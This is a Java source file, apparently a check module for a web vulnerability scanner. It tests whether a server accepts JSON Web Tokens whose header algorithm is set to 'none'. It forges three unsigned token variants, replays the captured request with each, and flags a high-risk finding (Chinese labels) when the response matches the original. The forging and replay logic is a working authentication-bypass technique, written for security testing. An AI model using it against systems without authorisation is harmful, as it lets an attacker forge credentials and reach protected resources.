package com.su.defect.vulnerability;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.JSONPath;
import com.su.analysis.Http_req_pars;
import com.su.analysis.Http_res_pars;
import com.su.analysis.Jwt_pars;
import com.su.util.Socket_http_utility;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.util.ArrayList;
import java.util.List;

public class None_token extends F_vulnerability {


    @Override
    public Boolean scan() {
        Jwt_pars jwt_pars = getHttp_req_pars().getJwt_pars();
        BASE64Decoder decoder = new BASE64Decoder();
        BASE64Encoder  encoder =new BASE64Encoder();
        try {
            byte[] bytes = decoder.decodeBuffer(jwt_pars.getHead());
            JSONObject jsonObject = JSONObject.parseObject(new String(bytes));
            String alg =jsonObject.getString("alg");

            JSONPath.set(jsonObject,"alg","none");
            String jsonStr = JSONObject.toJSONString(jsonObject);


            String n_head = encoder.encode(jsonStr.getBytes());
            Http_res_pars http_res_pars=Socket_http_utility.send_s_http2(getHttp_req_pars());
            String y_body = http_res_pars.getBody();

            String y_http_ = getHttp_req_pars().getHttp_text();
            String y_jwt = jwt_pars.getJwt_text();

            List<String> none_jwts = new ArrayList<>();
            none_jwts.add(n_head+"."+jwt_pars.getPayload()+".");
            none_jwts.add(n_head+"."+jwt_pars.getPayload());
            none_jwts.add(n_head+"."+jwt_pars.getPayload()+".21j32j13j2hgfg12g3h213h2gh3g21h1cvvowie1");

            for (String node_jwt:none_jwts){

                String node_http_= y_http_.replace(y_jwt,node_jwt);
                getHttp_req_pars().setHttp_text(node_http_);

                Http_res_pars http_res_pars_no=Socket_http_utility.send_s_http2(getHttp_req_pars());
                String node_body = http_res_pars_no.getBody();
                if (node_body.equals(y_body)){
                    setDescribe("可设置jwt head中的密钥类型为 none 可以绕过密钥限制");
                    setV_name("可设置 jwt none密钥");
                    setDetails(n_head+"可访问以有资源");
                    setRisk_level("高");
                    return true;
                }

            }

        }catch (Exception e){

        }
        return false;
    }
}
